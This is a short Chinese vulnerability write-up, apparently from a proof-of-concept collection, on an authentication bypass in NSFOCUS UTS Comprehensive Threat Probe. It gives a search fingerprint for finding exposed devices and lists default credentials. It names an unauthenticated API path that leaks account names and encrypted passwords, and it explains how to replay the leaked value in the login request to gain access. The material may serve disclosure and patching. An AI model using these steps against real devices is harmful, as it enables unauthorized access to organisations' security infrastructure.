# 绿盟 UTS综合威胁探针 信息泄露登陆绕过漏洞

## 漏洞描述

绿盟 UTS综合威胁探针 某个接口未做授权导致未授权漏洞

## 漏洞影响

<a-checkbox checked>绿盟 UTS综合威胁探针 </a-checkbox></br>	

## 网络测绘

<a-checkbox checked>app="NSFOCUS-UTS综合威胁探针"</a-checkbox></br>

## 漏洞复现

默认口令

<a-checkbox checked>admin/Nsfocus@123</a-checkbox></br>

<a-checkbox checked>auditor/auditor</a-checkbox></br>

登陆页面

![img](../../../.vuepress/public/img/1628385388371-8c2d0646-c565-4233-b44e-02cb22b7eb37.png)

验证POC

```php
/webapi/v1/system/accountmanage/account
```

![img](../../../.vuepress/public/img/1628385427610-3bc1805a-ebb0-4c88-9390-3244af8fe381.png)

这里出现了登录的账号以及加密的 PASS

登陆时的加密字段抓包修改为获取的就可以登陆系统

![img](../../../.vuepress/public/img/1628386133132-32cc96fd-6816-4c83-a753-78d6f30dfaf6.png)

![img](../../../.vuepress/public/img/1628386108554-9d4b5304-cb43-4a67-80b8-a00544149d48.png)